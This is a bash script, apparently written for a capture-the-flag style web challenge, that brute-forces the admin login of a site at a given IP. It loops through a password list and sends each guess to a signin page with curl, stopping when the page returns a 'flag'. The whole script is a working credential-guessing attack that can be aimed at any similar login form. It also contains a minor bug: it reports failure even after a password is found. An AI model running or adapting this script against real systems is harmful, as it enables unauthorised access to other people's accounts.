#!/bin/bash

if [ "$#" -eq 0 ]; then
    echo "usage: $0 <ip> [continue from #]"
    exit 1
fi

if [ ! -z "$2" ] && [ "$2" -gt 0 ] 2>/dev/null; then
    start=$2
else
    start=0
fi


pswdlist=($(cat pswdlist))
#pswdlist=($(cat xato-net-10-million-passwords-1000.txt))
length=${#pswdlist[@]}
current=$start
ip_address="$1"
i=0

echo $length

trap ctrl_c INT
function ctrl_c() {
    echo -e "\ninterrupted at $current"
    exit 1
}


echo "starting at #$start"

for pswd in "${pswdlist[@]}"
do
    i=$((i+1))
    if [ "$i" -lt "$start" ]; then
    echo -ne "skipping #$i $pswd\r"
        continue
    fi

    response=$(curl -s "http://$ip_address/?page=signin&username=admin&password=$pswd&Login=Login" | grep -i "flag")

    if [ ! -z "$response" ]; then
        echo "FOUND IT ! Password is : $pswd"
        echo $response
        break
    fi

    echo -ne "Current progress : $(((current * 100) / length))% #$i $pswd\r"
    current=$((current+1))

done

echo "\nfailed to find password"
exit 1